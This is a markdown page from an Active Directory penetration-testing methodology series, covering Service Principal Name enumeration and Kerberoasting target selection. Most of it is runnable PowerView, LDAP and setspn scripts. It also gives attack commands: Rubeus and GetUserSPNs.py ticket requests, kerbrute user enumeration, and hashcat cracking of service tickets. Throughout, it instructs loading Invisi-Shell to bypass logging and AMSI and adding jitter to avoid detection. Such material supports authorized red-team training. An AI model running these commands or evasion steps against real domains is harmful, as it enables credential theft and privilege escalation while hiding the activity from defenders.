[Prev: 23_Kerberos_Basic_Enumeration.md](./23_Kerberos_Basic_Enumeration.md) | [Up: Index](./00_Enumeration_Index.md) | [Hub](./00_Methodology_Hub.md) | [Next: 25_Kerberos_Delegation_Abuse.md](./25_Kerberos_Delegation_Abuse.md)

# 🎯 SPN Enumeration Techniques - Service Principal Name Discovery

> **⚠️ CRITICAL TOOL REQUIREMENT**: **Invisi-Shell** is mandatory for production environments to ensure stealth operations and avoid detection. See [Tool Arsenal](./01_Tool_Setup_Loading.md#-invisi-shell-complete-setup) for setup instructions.

## At‑a‑Glance

### Command Quick‑Reference
| Tool | Purpose | Example | Notes |
| - | - | - | - |
| Get-DomainUser -SPN | User SPNs | Get-DomainUser -SPN | Primary
| Get-DomainComputer -SPN | Host SPNs | Get-DomainComputer -SPN | Map hosts
| setspn.exe -Q | Grep SPNs | setspn -Q MSSQLSvc/* | Native
| AD module | Filtered SPNs | Get-ADUser -LDAPFilter '(servicePrincipalName=*)' | Signed

### Pivot Matrix
| Finding | Pivot To | Goal |
| - | - | - |
| CIFS/LDAP SPNs | 26_Kerberos_Advanced_Attacks.md | High-impact roasting
| MSSQLSvc density | 28_SQL_Server_Enumeration.md | DB lateral path
| HTTP app pools | 07_Computer_Enumeration.md | Web tier mapping
| Service accounts in admin groups | 09_ACL_Enumeration.md | Rights abuse

## 📋 **QUICK START SPN DISCOVERY**

| Phase | Tool | Command | Purpose | OPSEC |
|------|------|---------|---------|------|
| 1 | MS AD Module | `Get-ADUser -LDAPFilter '(servicePrincipalName=*)' -ResultSetSize 25` | Scoped SPN sample | 🟢 |
| 2 | PowerView | `Get-DomainUser -SPN | Select -First 25` | User SPN sampling | 🟡 |
| 3 | PowerView | `Get-DomainComputer -SPN | Select -First 25` | Host SPN sampling | 🟡 |
| 4 | Red Team | `Rubeus kerberoast /outfile:roast.hashes /rc4opsec` | Controlled roast | 🟠 |

---

## 🛠️ **COMPREHENSIVE ENUMERATION TOOLS**

### 🔧 Microsoft‑Signed & Native
- `Get-ADUser -LDAPFilter '(servicePrincipalName=*)' -Properties ServicePrincipalName -ResultSetSize 50`
- `Get-ADComputer -LDAPFilter '(servicePrincipalName=*)' -Properties ServicePrincipalName -ResultSetSize 50`
- `setspn -Q MSSQLSvc/*`, `setspn -Q HTTP/*` (avoid `*/ *` in prod)
- `wevtutil`, `klist` for sanity checks

### ⚔️ Offensive (PowerView/SharpView)
```powershell
# User SPNs
Get-DomainUser -SPN
Get-DomainUser -LDAPFilter '(servicePrincipalName=*)' -Properties samaccountname,serviceprincipalname
Get-DomainUser -SPN | Select -First 50
Get-DomainUser -SPN | Where-Object {$_.serviceprincipalname -like '*HTTP*'}
Get-DomainUser -SPN | Where-Object {$_.serviceprincipalname -like '*MSSQLSvc*'}
Get-DomainUser -SPN | Where-Object {$_.serviceprincipalname -like '*CIFS*'}

# Computer SPNs
Get-DomainComputer -SPN -Properties name,serviceprincipalname
Get-DomainComputer -LDAPFilter '(servicePrincipalName=*)' -Properties name,serviceprincipalname

# Group and ACL context for SPN users
Get-DomainUser -SPN -Properties memberof | Select samaccountname,memberof -First 25
Get-DomainObjectAcl -SearchBase (Get-Domain).DistinguishedName -ResolveGUIDs | Where-Object {$_.ObjectAceType -like '*Service*'}

# Export/summaries
Get-DomainUser -SPN | Select samaccountname | Export-Csv spn_users_sample.csv -NoTypeInformation
```
```cmd
SharpView.exe Get-DomainUser -SPN
SharpView.exe Get-DomainComputer -SPN
```

### 🔴 Red Team (SPN‑focused)
```cmd
Rubeus.exe kerberoast /rc4opsec /outfile:spn_hashes.txt
Rubeus.exe kerberoast /user:svc_sql /nowrap /outfile:svc_sql.hash
```
```bash
GetUserSPNs.py corp.local/USER:'P@ssw0rd!' -dc-ip 10.0.0.10 -request -outputfile spn_tgs.kirbi
GetUserSPNs.py corp.local/ -usersfile users.txt -format hashcat -outputfile roast_hashes.txt
```
```bash
kerbrute userenum -d corp.local users.txt --dc dc01.corp.local
```

### 🛠️ Alternative & 🔍 Specialized
- AdFind, LDAPDomainDump; SharpKerberos for advanced cases

---

## 🎯 **SPN COMMANDS (20+ PowerView/SharpView)**

```powershell
# Breadth discovery
Get-DomainUser -SPN
Get-DomainComputer -SPN
Get-DomainUser -LDAPFilter '(servicePrincipalName=*)' -Properties samaccountname,serviceprincipalname
Get-DomainComputer -LDAPFilter '(servicePrincipalName=*)' -Properties name,serviceprincipalname

# Service-type filters
Get-DomainUser -SPN | Where {$_.serviceprincipalname -like '*HTTP*'}
Get-DomainUser -SPN | Where {$_.serviceprincipalname -like '*MSSQLSvc*'}
Get-DomainUser -SPN | Where {$_.serviceprincipalname -like '*CIFS*'}
Get-DomainUser -SPN | Where {$_.serviceprincipalname -like '*LDAP*'}

# Sampling and counts
Get-DomainUser -SPN | Select -First 25
(Get-DomainUser -SPN).Count
Get-DomainUser -SPN -Properties serviceprincipalname | ForEach-Object { $_.serviceprincipalname } | Group-Object | Sort Count -Desc | Select -First 10

# Group/rights context
Get-DomainUser -SPN -Properties memberof | Select samaccountname,memberof -First 25
Get-DomainObjectAcl -SearchBase (Get-Domain).DistinguishedName -ResolveGUIDs | Where {$_.ObjectAceType -like '*Service*'}

# Host mapping
Get-DomainComputer -SPN -Properties name,serviceprincipalname | ForEach-Object { $_.serviceprincipalname | ForEach-Object { [pscustomobject]@{ Host=$_.Split('/')[1] } } } | Group Host | Sort Count -Desc | Select -First 10

# Target prep (noisy in lab only)
Get-DomainSPNTicket -SPN MSSQL/* -OutputFormat Hashcat
```

## Stealth & Loading
Use [01_Tool_Setup_Loading.md](./01_Tool_Setup_Loading.md) for stealth session and prep. Continue here with SPN‑specific enumeration only.

## CyberCorp Persona
- Persona: Sofia Nguyen, App Infra Analyst. Goal: map SPNs across WEB/SQL tiers and shortlist roastable targets without bulk dumps.

## SPN Landscape (unique)


## Minimal‑Footprint Discovery (users vs computers)
```powershell
# Users with any SPN (sample only)
Get-DomainUser -SPN -Properties serviceprincipalname | Select samaccountname -First 10
# Computers with SPNs (service hosts)
Get-DomainComputer -SPN -Properties serviceprincipalname | Select name -First 10
```

## Patterning Without Dumping
```powershell
# Count by service type without expanding full lists
($svc = Get-DomainUser -SPN -Properties serviceprincipalname | ForEach-Object { $_.serviceprincipalname } | ForEach-Object { ($_ -split '/')[0] }) |
  Group-Object | Sort-Object Count -Descending | Select -First 10
```

## Lab vs Production
- Stealth: sample-first, no full SPN export; prefer ADWS; cap with -First/-ResultSetSize.
- Lab: full SPN export, frequency analysis; correlate with ticket request timings (21_Time_Based_Enumeration.md).

## Detection/OPSEC
- Avoid setspn -Q */* on prod; prefer scoped types. Space TGS requests; do not request TGS until shortlist confirmed.
- Prefer MS‑signed AD module first with OU‑scoped filters and minimal properties.
- Add jitter (3–6s) between queries in production and cap with -First/-ResultSetSize.
- Validate DNS vs LDAP timing; keep transport consistent per baseline.

> **🔒 STEALTH REQUIREMENT**: **Invisi-Shell** must be loaded before any SPN enumeration in production environments to bypass logging and AMSI detection.

## Cleanup
```powershell
klist purge; Remove-Variable svc -ErrorAction SilentlyContinue
```

---

## 🔗 **CROSS-REFERENCES & INTEGRATION**

### 📚 Related Techniques
- [23_Kerberos_Basic_Enumeration.md](./23_Kerberos_Basic_Enumeration.md)
- [25_Kerberos_Delegation_Abuse.md](./25_Kerberos_Delegation_Abuse.md)
- [26_Kerberos_Advanced_Attacks.md](./26_Kerberos_Advanced_Attacks.md)

### 🛠️ Tool Dependencies
- [01_Tool_Setup_Loading.md](./01_Tool_Setup_Loading.md)
- [02_Network_Enumeration.md](./02_Network_Enumeration.md)
- [03_DNS_Enumeration.md](./03_DNS_Enumeration.md)

## 📋 TABLE OF CONTENTS
1. [Overview](#-overview)
2. [SPN Fundamentals](#-spn-fundamentals)
3. [SPN Discovery Techniques](#-spn-discovery-techniques)
4. [Service Account Analysis](#-service-account-analysis)
5. [SPN Pattern Analysis](#-spn-pattern-analysis)
6. [Cross-References](#-cross-references)

## 🎯 OVERVIEW

**SPN Enumeration Techniques** provides comprehensive methods for discovering and analyzing Service Principal Names (SPNs) within Active Directory environments. This file focuses on SPN discovery, service account identification, and pattern analysis for attack planning.

### **🌟 What You'll Learn**
- **SPN discovery techniques** using multiple tools and methods
- **Service account identification** and privilege analysis
- **SPN pattern analysis** for attack vector identification
- **Service infrastructure mapping** across the domain
- **Foundation for Kerberoasting** and delegation attacks

---

## 🎯 SPN FUNDAMENTALS

### **What is an SPN?**
An **SPN (Service Principal Name)** is a unique identifier for a service instance within a Windows domain. Think of it as a "business card" that tells Kerberos authentication which service you want to connect to.

### **SPN Format and Structure**

```mermaid
graph TB
    subgraph "🎯 SPN Structure Breakdown"
        A[🎯 Service Type] --> B[🖥️ Hostname]
        B --> C[🔌 Port Number]
        C --> D[📝 Service Name]
        
        A1[MSSQLSvc] --> A
        A2[HTTP] --> A
        A3[CIFS] --> A
        A4[LDAP] --> A
        
        B1[SQL01.cybercorp.local] --> B
        B2[WEB01.cybercorp.local] --> B
        B3[FILE01.cybercorp.local] --> B
        
        C1[1433] --> C
        C2[80/443] --> C
        C3[445] --> C
        
        D1[Database Name] --> D
        D2[Virtual Directory] --> D
        D3[Share Name] --> D
    end
    
    subgraph "📋 SPN Examples"
        E[MSSQLSvc/SQL01.cybercorp.local:1433]
        F[HTTP/WEB01.cybercorp.local]
        G[CIFS/FILE01.cybercorp.local]
        H[LDAP/DC01.cybercorp.local:389]
    end
    
    style A fill:#ff6b6b,stroke:#333,stroke-width:3px
    style B fill:#4ecdc4,stroke:#333,stroke-width:2px
    style C fill:#45b7d1,stroke:#333,stroke-width:2px
    style D fill:#96ceb4,stroke:#333,stroke-width:2px
```


### **Common SPN Types**
- **Database Services**: `MSSQLSvc`, `OracleService`, `MySQL`
- **Web Services**: `HTTP`, `HTTPS`, `IIS`
- **File Services**: `CIFS`, `SMB`, `NFS`
- **Directory Services**: `LDAP`, `GC`, `KDC`
- **Custom Services**: `CustomApp`, `ServiceName`

---

## 🔍 SPN DISCOVERY TECHNIQUES

### **1. PowerView SPN Enumeration**

#### **Basic SPN Discovery**
```powershell
# Basic SPN enumeration using PowerView
Write-Host "=== BASIC SPN DISCOVERY ===" -ForegroundColor Green

# Get all users with SPNs
$usersWithSPNs = Get-DomainUser -SPN -Properties servicePrincipalName, samaccountname, displayname

Write-Host "Users with SPNs: $($usersWithSPNs.Count)" -ForegroundColor Cyan

foreach ($user in $usersWithSPNs | Select-Object -First 10) {
    Write-Host "  User: $($user.SamAccountName)" -ForegroundColor White
    Write-Host "    Display Name: $($user.DisplayName)" -ForegroundColor Gray
    Write-Host "    SPNs: $($user.servicePrincipalName -join ', ')" -ForegroundColor Yellow
    Write-Host ""
}

# Get all computers with SPNs
$computersWithSPNs = Get-DomainComputer -SPN -Properties servicePrincipalName, samaccountname, operatingsystem

Write-Host "Computers with SPNs: $($computersWithSPNs.Count)" -ForegroundColor Cyan

foreach ($computer in $computersWithSPNs | Select-Object -First 10) {
    Write-Host "  Computer: $($computer.SamAccountName)" -ForegroundColor White
    Write-Host "    OS: $($computer.OperatingSystem)" -ForegroundColor Gray
    Write-Host "    SPNs: $($computer.servicePrincipalName -join ', ')" -ForegroundColor Yellow
    Write-Host ""
}
```

#### **Advanced SPN Discovery**
```powershell
# Advanced SPN discovery with filtering
Write-Host "=== ADVANCED SPN DISCOVERY ===" -ForegroundColor Green

# Find specific SPN types
$mssqlSPNs = Get-DomainUser -SPN -Properties servicePrincipalName, samaccountname | Where-Object {
    $_.servicePrincipalName -like "*MSSQLSvc*"
}

Write-Host "SQL Server SPNs: $($mssqlSPNs.Count)" -ForegroundColor Yellow
foreach ($spn in $mssqlSPNs) {
    Write-Host "  - $($spn.SamAccountName)" -ForegroundColor White
    Write-Host "    SPN: $($spn.servicePrincipalName -join ', ')" -ForegroundColor Cyan
}

# Find HTTP/HTTPS SPNs
$httpSPNs = Get-DomainUser -SPN -Properties servicePrincipalName, samaccountname | Where-Object {
    $_.servicePrincipalName -like "*HTTP*" -or $_.servicePrincipalName -like "*HTTPS*"
}

Write-Host "`nHTTP/HTTPS SPNs: $($httpSPNs.Count)" -ForegroundColor Yellow
foreach ($spn in $httpSPNs) {
    Write-Host "  - $($spn.SamAccountName)" -ForegroundColor White
    Write-Host "    SPN: $($spn.servicePrincipalName -join ', ')" -ForegroundColor Cyan
}

# Find file sharing SPNs
$fileSPNs = Get-DomainUser -SPN -Properties servicePrincipalName, samaccountname | Where-Object {
    $_.servicePrincipalName -like "*CIFS*" -or $_.servicePrincipalName -like "*SMB*"
}

Write-Host "`nFile Sharing SPNs: $($fileSPNs.Count)" -ForegroundColor Yellow
foreach ($spn in $fileSPNs) {
    Write-Host "  - $($spn.SamAccountName)" -ForegroundColor White
    Write-Host "    SPN: $($spn.servicePrincipalName -join ', ')" -ForegroundColor Cyan
}
```

### **2. Native Windows Tools SPN Discovery**

#### **PowerShell Active Directory Module**
```powershell
# Using native PowerShell AD module
Write-Host "=== NATIVE POWERSHELL SPN DISCOVERY ===" -ForegroundColor Green

# Import AD module
Import-Module ActiveDirectory

# Find users with SPNs
$adUsersWithSPNs = Get-ADUser -Filter "servicePrincipalName -like '*'" -Properties servicePrincipalName, samaccountname, displayname

Write-Host "AD Users with SPNs: $($adUsersWithSPNs.Count)" -ForegroundColor Cyan

foreach ($user in $adUsersWithSPNs | Select-Object -First 10) {
    Write-Host "  User: $($user.SamAccountName)" -ForegroundColor White
    Write-Host "    Display Name: $($user.DisplayName)" -ForegroundColor Gray
    Write-Host "    SPNs: $($user.servicePrincipalName -join ', ')" -ForegroundColor Yellow
    Write-Host ""
}

# Find computers with SPNs
$adComputersWithSPNs = Get-ADComputer -Filter "servicePrincipalName -like '*'" -Properties servicePrincipalName, samaccountname, operatingsystem

Write-Host "AD Computers with SPNs: $($adComputersWithSPNs.Count)" -ForegroundColor Cyan

foreach ($computer in $adComputersWithSPNs | Select-Object -First 10) {
    Write-Host "  Computer: $($computer.SamAccountName)" -ForegroundColor White
    Write-Host "    OS: $($computer.OperatingSystem)" -ForegroundColor Gray
    Write-Host "    SPNs: $($computer.servicePrincipalName -join ', ')" -ForegroundColor Yellow
    Write-Host ""
}
```

#### **Command Line Tools**
```cmd
# Using setspn.exe for SPN enumeration
setspn -Q */*

# Using setspn.exe for specific SPN types
setspn -Q MSSQLSvc/*

# Using setspn.exe for specific users
setspn -L username

# Using dsquery for SPN enumeration
dsquery user -spn
dsquery computer -spn
```

### **3. LDAP-Based SPN Discovery**

#### **Direct LDAP Queries**
```powershell
# Direct LDAP queries for SPN discovery
Write-Host "=== LDAP-BASED SPN DISCOVERY ===" -ForegroundColor Green

# Create LDAP searcher
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$env:USERDNSDOMAIN")
$searcher.Filter = "(servicePrincipalName=*)"
$searcher.PropertiesToLoad.AddRange(@("servicePrincipalName", "sAMAccountName", "objectClass"))

# Execute search
$results = $searcher.FindAll()

Write-Host "LDAP SPN Results: $($results.Count)" -ForegroundColor Cyan

foreach ($result in $results | Select-Object -First 10) {
    $samAccount = $result.Properties["sAMAccountName"][0]
    $objectClass = $result.Properties["objectClass"][-1]
    $spns = $result.Properties["servicePrincipalName"]
    
    Write-Host "  Object: $samAccount ($objectClass)" -ForegroundColor White
    Write-Host "    SPNs: $($spns -join ', ')" -ForegroundColor Yellow
    Write-Host ""
}
```

---

## 👤 SERVICE ACCOUNT ANALYSIS

### **Service Account Identification**

#### **Comprehensive Service Account Analysis**
```powershell
# Comprehensive service account analysis
Write-Host "=== COMPREHENSIVE SERVICE ACCOUNT ANALYSIS ===" -ForegroundColor Green

# Get all service accounts with detailed properties
$serviceAccounts = Get-DomainUser -SPN -Properties servicePrincipalName, samaccountname, displayname, 
    lastlogondate, pwdlastset, useraccountcontrol, admincount, description

Write-Host "Total Service Accounts: $($serviceAccounts.Count)" -ForegroundColor Cyan

# Analyze service account characteristics
$highValueAccounts = @()
$normalAccounts = @()

foreach ($account in $serviceAccounts) {
    $accountInfo = @{
        SamAccountName = $account.SamAccountName
        DisplayName = $account.DisplayName
        SPNs = $account.servicePrincipalName
        LastLogon = $account.LastLogonDate
        PasswordLastSet = $account.PwdLastSet
        AdminCount = $account.AdminCount
        Description = $account.Description
        RiskLevel = "Normal"
    }
    
    # Risk assessment
    if ($account.AdminCount -eq 1) {
        $accountInfo.RiskLevel = "HIGH"
        $highValueAccounts += $accountInfo
    } elseif ($account.servicePrincipalName -like "*CIFS*" -or $account.servicePrincipalName -like "*LDAP*") {
        $accountInfo.RiskLevel = "MEDIUM"
        $highValueAccounts += $accountInfo
    } else {
        $normalAccounts += $accountInfo
    }
}

# Display high-value accounts
Write-Host "`nHigh-Value Service Accounts:" -ForegroundColor Red
foreach ($account in $highValueAccounts) {
    Write-Host "  Account: $($account.SamAccountName)" -ForegroundColor White
    Write-Host "    Display Name: $($account.DisplayName)" -ForegroundColor Gray
    Write-Host "    Risk Level: $($account.RiskLevel)" -ForegroundColor Red
    Write-Host "    SPNs: $($account.SPNs -join ', ')" -ForegroundColor Yellow
    Write-Host "    Admin Count: $($account.AdminCount)" -ForegroundColor Cyan
    Write-Host "    Last Logon: $($account.LastLogon)" -ForegroundColor Gray
    Write-Host "    Password Last Set: $($account.PasswordLastSet)" -ForegroundColor Gray
    Write-Host ""
}
```

### **Service Account Privilege Analysis**

#### **Privilege and Permission Analysis**
```powershell
# Analyze service account privileges and permissions
Write-Host "=== SERVICE ACCOUNT PRIVILEGE ANALYSIS ===" -ForegroundColor Green

# Get service accounts with group memberships
$serviceAccountsWithGroups = Get-DomainUser -SPN -Properties servicePrincipalName, samaccountname, 
    memberof, admincount, useraccountcontrol

foreach ($account in $serviceAccountsWithGroups | Select-Object -First 10) {
    Write-Host "Account: $($account.SamAccountName)" -ForegroundColor White
    
    # Analyze group memberships
    if ($account.MemberOf) {
        Write-Host "  Group Memberships:" -ForegroundColor Cyan
        foreach ($group in $account.MemberOf) {
            $groupName = $group.Split(',')[0].Replace('CN=', '')
            Write-Host "    - $groupName" -ForegroundColor Gray
            
            # Check for high-value groups
            if ($groupName -like "*Admin*" -or $groupName -like "*Domain*" -or $groupName -like "*Enterprise*") {
                Write-Host "      ⚠️ HIGH-VALUE GROUP!" -ForegroundColor Red
            }
        }
    }
    
    # Analyze account control flags
    $uac = $account.UserAccountControl
    Write-Host "  Account Control Flags:" -ForegroundColor Cyan
    Write-Host "    - Admin Count: $($account.AdminCount)" -ForegroundColor Gray
    Write-Host "    - Trusted for Delegation: $(if ($uac -band 0x80000) { 'Yes' } else { 'No' })" -ForegroundColor Gray
    Write-Host "    - Constrained Delegation: $(if ($uac -band 0x20000) { 'Yes' } else { 'No' })" -ForegroundColor Gray
    Write-Host ""
}
```

---

## 🔍 SPN PATTERN ANALYSIS

### **SPN Pattern Recognition**

#### **Pattern Analysis for Attack Planning**
```powershell
# SPN pattern analysis for attack planning
Write-Host "=== SPN PATTERN ANALYSIS FOR ATTACK PLANNING ===" -ForegroundColor Green

# Collect all SPNs for analysis
$allSPNs = @()
$serviceAccounts = Get-DomainUser -SPN -Properties servicePrincipalName, samaccountname

foreach ($account in $serviceAccounts) {
    foreach ($spn in $account.servicePrincipalName) {
        $spnInfo = @{
            SPN = $spn
            Account = $account.SamAccountName
            ServiceType = $spn.Split('/')[0]
            Hostname = $spn.Split('/')[1].Split(':')[0]
            Port = if ($spn -like "*:*") { $spn.Split(':')[1].Split('/')[0] } else { "Default" }
        }
        $allSPNs += $spnInfo
    }
}

# Analyze service types
$serviceTypes = $allSPNs | Group-Object -Property ServiceType | Sort-Object Count -Descending

Write-Host "Service Type Distribution:" -ForegroundColor Yellow
foreach ($serviceType in $serviceTypes) {
    Write-Host "  $($serviceType.Name): $($serviceType.Count)" -ForegroundColor White
}

# Analyze hostname patterns
$hostnames = $allSPNs | Group-Object -Property Hostname | Sort-Object Count -Descending

Write-Host "`nHostname Distribution:" -ForegroundColor Yellow
foreach ($hostname in $hostnames | Select-Object -First 10) {
    Write-Host "  $($hostname.Name): $($hostname.Count) services" -ForegroundColor White
}

# Identify high-value targets
Write-Host "`nHigh-Value SPN Targets:" -ForegroundColor Red
$highValueSPNs = $allSPNs | Where-Object {
    $_.ServiceType -like "*CIFS*" -or $_.ServiceType -like "*LDAP*" -or 
    $_.ServiceType -like "*RPCSS*" -or $_.ServiceType -like "*MSSQLSvc*"
}

foreach ($spn in $highValueSPNs) {
    Write-Host "  - $($spn.SPN)" -ForegroundColor White
    Write-Host "    Account: $($spn.Account)" -ForegroundColor Gray
    Write-Host "    Service: $($spn.ServiceType)" -ForegroundColor Yellow
    Write-Host "    Host: $($spn.Hostname)" -ForegroundColor Cyan
    Write-Host ""
}
```

### **Attack Vector Identification**

#### **Kerberoasting Target Identification**
```powershell
# Identify Kerberoasting targets
Write-Host "=== KERBEROASTING TARGET IDENTIFICATION ===" -ForegroundColor Green

# Find ideal Kerberoasting targets
$kerberoastingTargets = Get-DomainUser -SPN -Properties servicePrincipalName, samaccountname, 
    lastlogondate, pwdlastset, useraccountcontrol | Where-Object {
    # Filter for high-value targets
    $_.servicePrincipalName -like "*CIFS*" -or 
    $_.servicePrincipalName -like "*LDAP*" -or 
    $_.servicePrincipalName -like "*MSSQLSvc*" -or
    $_.servicePrincipalName -like "*HTTP*"
}

Write-Host "Kerberoasting Targets Found: $($kerberoastingTargets.Count)" -ForegroundColor Cyan

foreach ($target in $kerberoastingTargets) {
    Write-Host "  Target: $($target.SamAccountName)" -ForegroundColor White
    Write-Host "    SPNs: $($target.servicePrincipalName -join ', ')" -ForegroundColor Yellow
    
    # Assess target value
    if ($target.servicePrincipalName -like "*CIFS*" -or $target.servicePrincipalName -like "*LDAP*") {
        Write-Host "    ⚠️ CRITICAL TARGET - High-value service!" -ForegroundColor Red
    } elseif ($target.servicePrincipalName -like "*MSSQLSvc*") {
        Write-Host "    🔴 HIGH-VALUE TARGET - Database service!" -ForegroundColor Red
    } elseif ($target.servicePrincipalName -like "*HTTP*") {
        Write-Host "    🟡 MEDIUM-VALUE TARGET - Web service!" -ForegroundColor Yellow
    }
    
    Write-Host "    Last Logon: $($target.LastLogonDate)" -ForegroundColor Gray
    Write-Host "    Password Last Set: $($target.PwdLastSet)" -ForegroundColor Gray
    Write-Host ""
}
```

---

## 🔗 CROSS-REFERENCES

### **Related Kerberos Techniques**
- **Basic Kerberos Enumeration**: See [13_Kerberos_Basic_Enumeration.md](./23_Kerberos_Basic_Enumeration.md)
- **Delegation Abuse**: See [15_Kerberos_Delegation_Abuse.md](./25_Kerberos_Delegation_Abuse.md)
- **Advanced Attacks**: See [16_Kerberos_Advanced_Attacks.md](./26_Kerberos_Advanced_Attacks.md)

### **Related Enumeration Techniques**
- **User Enumeration**: See [02_User_Enumeration.md](./05_User_Enumeration.md)
- **Computer Enumeration**: See [03_Computer_Enumeration.md](./07_Computer_Enumeration.md)
- **Tool Setup**: See [01_Tool_Setup_Loading.md](./01_Tool_Setup_Loading.md)

### **Detection and Evasion**
- **Blue Team Detection**: See [11_Detection_Blue_Team.md](./32_Detection_Blue_Team.md)
- **Red Team Evasion**: See [12_Detection_Red_Team.md](./33_Detection_Red_Team.md)

---

## 🎯 CONCLUSION

**SPN Enumeration Techniques** provides comprehensive methods for discovering and analyzing Service Principal Names. By mastering these techniques, you can:

- **Identify all service accounts** and their associated services
- **Map service infrastructure** across the domain
- **Analyze SPN patterns** for attack vector identification
- **Identify high-value targets** for Kerberoasting attacks
- **Build foundation knowledge** for delegation abuse

### **🚀 Key Success Factors**
1. **Comprehensive Discovery**: Use multiple tools and methods for complete coverage
2. **Pattern Recognition**: Identify common SPN patterns and service types
3. **Risk Assessment**: Evaluate targets based on service type and privileges
4. **Attack Planning**: Use SPN analysis to plan effective attacks
5. **Infrastructure Mapping**: Build complete picture of service landscape

---

**🎯 Remember**: SPN enumeration is like reading a city's business directory - you need to know what services exist and where they're located before you can plan your attack strategy!**

---

## 📚 **NEXT STEPS**

After mastering SPN Enumeration, continue with:
- **Delegation Abuse**: See [15_Kerberos_Delegation_Abuse.md](./25_Kerberos_Delegation_Abuse.md)
- **Advanced Attacks**: See [16_Kerberos_Advanced_Attacks.md](./26_Kerberos_Advanced_Attacks.md)
- **Basic Kerberos**: See [13_Kerberos_Basic_Enumeration.md](./23_Kerberos_Basic_Enumeration.md)

---

## ⚔️ Execution

### Targeted Kerberoasting from SPNs
```powershell
# Filter high-value SPNs
Get-DomainUser -SPN -Properties memberof | Where-Object { $_.memberof -like '*Domain Admins*' -or $_.memberof -like '*SQL*' } |
  Select samaccountname,serviceprincipalname

# Request only selected SPNs (Rubeus)
.\Rubeus.exe kerberoast /user:websvc /outfile:websvc.hash

# Crack
hashcat -m 13100 websvc.hash wordlist.txt --force
```
- Use this after mapping SPNs here; see basics in `13_Kerberos_Basic_Enumeration.md`; advanced OPSEC/detection in `16_Kerberos_Advanced_Attacks.md`, `11_Detection_Blue_Team.md`.


---

[Prev: 23_Kerberos_Basic_Enumeration.md](./23_Kerberos_Basic_Enumeration.md) | [Up: Index](./00_Enumeration_Index.md) | [Hub](./00_Methodology_Hub.md) | [Next: 25_Kerberos_Delegation_Abuse.md](./25_Kerberos_Delegation_Abuse.md)

---

## 🔗 **RELATED ACTIVE DIRECTORY COMPONENTS**

### **🎯 Service Principal Components**
- **[Kerberos](../02_Active_Directory_Components/16_Kerberos.md)**: SPN authentication and ticket issuance
- **[User Accounts](../02_Active_Directory_Components/17_User_Accounts.md)**: Service accounts with SPNs
- **[Schema](../02_Active_Directory_Components/11_Schema.md)**: SPN object attributes and properties

### **🏗️ Infrastructure Components**
- **[Domain Controllers](../02_Active_Directory_Components/02_Domain_Controllers.md)**: KDC servers managing SPN authentication
- **[Domain](../02_Active_Directory_Components/03_Domain.md)**: Domain boundaries for SPN scope
- **[Forest](../02_Active_Directory_Components/04_Forest.md)**: Forest-wide SPN resolution

### **🔐 Security and Trust Components**
- **[Trusts](../02_Active_Directory_Components/07_Trusts.md)**: Cross-domain SPN authentication
- **[Group Policy Objects](../02_Active_Directory_Components/09_Group_Policy_Objects.md)**: SPN security policies
- **[FSMO Roles](../02_Active_Directory_Components/08_FSMO_Roles.md)**: Role-specific SPN configurations

---

## 🚀 **SPN ENUMERATION TECHNIQUES OVERVIEW**
